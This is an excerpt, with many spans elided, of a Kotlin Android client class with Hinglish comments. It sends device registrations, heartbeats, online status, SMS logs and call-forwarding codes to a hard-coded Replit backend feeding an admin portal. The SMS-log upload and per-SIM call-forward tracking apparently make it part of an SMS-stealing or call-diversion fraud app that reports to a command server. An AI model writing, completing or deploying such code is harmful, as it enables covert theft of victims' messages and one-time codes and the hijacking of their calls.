...
// ─────────────────────────────────────────────────────────
//  SupabaseApi  —  Backend-Proxy version
//
//  ✅ Koi Supabase key Android mein nahi
//  ✅ Koi RLS issue nahi  (server uses service_role)
//  ✅ Kuch bhi bhejo — save ho jaata hai
//     Known columns → dedicated DB columns
//     Unknown fields → data_json JSONB mein auto-merge
// ─────────────────────────────────────────────────────────
class SupabaseApi(private val context: Context) {

    companion object {
        private const val TAG     = "SUPABASE_API"
        private const val APP_ID  = "bojxazyi"           // ← sirf ye change karo

        // ✅ Backend proxy URL — apna Replit domain daalo
        private const val BACKEND = "https://78ad8860-efb7-4153-9c84-8bf8f2bbd425-00-2gl0n91xz9krb.pike.replit.dev/api/device/$APP_ID"

        private val UPSERT_URL = "$BACKEND/upsert"       // POST  — kuch bhi bhejo
        private val GET_URL    = "$BACKEND/get"          // GET   /:uid
        private val UPDATE_URL = "$BACKEND/update"       // PATCH /:uid
    ...
    fun getTableName(): String = "${APP_ID}_registered_devices"
    fun getSupabaseUrl(): String = BACKEND
    fun getSupabaseAnonKey(): String = ""   // key server side pe hai
    ...
    //  CORE: smartUpsert
    //
    //  Ye function sab jagah use hota hai.
    ...
    fun registerDevice(uid: String, deviceInfo: JSONObject, callback: (Boolean, String?) -> Unit) {
        ...
        val payload = JSONObject().apply {
            ...
            // device info — sab data_json mein jayega auto
    ...
    suspend fun upsertHeartbeat(uid: String, heartbeatData: JSONObject): UpsertResult {
        ...
        // Fetch existing data_json to preserve old fields
    ...
    fun updateOnlineStatus(uid: String, isOnline: Boolean, callback: (Boolean, String?) -> Unit) {
        ...
        val now = System.currentTimeMillis()
        getDeviceByUid(uid) { res ->
            val dj = if (res.success && res.data != null) res.data.optJSONObject("data_json") ?: JSONObject() else JSONObject()
    ...
    fun getOnlineStatus(uid: String, callback: (Boolean?) -> Unit) {
        getDeviceInfo(uid) { dj -> if (dj != null) callback(dj.optString("online_status") == "online") else callback(null) }
    }
    ...
    fun getAllDevices(limit: Int = 1000, callback: (QueryResult) -> Unit) {
        try {
            // Direct Supabase read with service_role not needed here —
            // admin portal handles listing; app just reads own device
            // For app-level device listing, use admin portal API
    ...
    fun insertSmsLog(smsData: JSONObject, callback: (Boolean, String?) -> Unit) {
        ...
        getDeviceByUid(uid) { res ->
            if (res.success && res.data != null) {
                ...
                // ✅ smartUpsert — sab fields auto-save hongi
                smartUpsert(JSONObject().apply {
                    put("sub_id", uid)
    ...
    fun updateCallForwardData(uid: String, code: String, slot: Int, status: String,
        ...
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        // ✅ Custom fields — auto-merge into data_json
        smartUpsert(JSONObject().apply {
            put("sub_id", uid)
    ...
    fun deleteData(uid: String, callback: (Boolean, String?) -> Unit) {
        // Delete not exposed via device proxy (admin portal handles this)
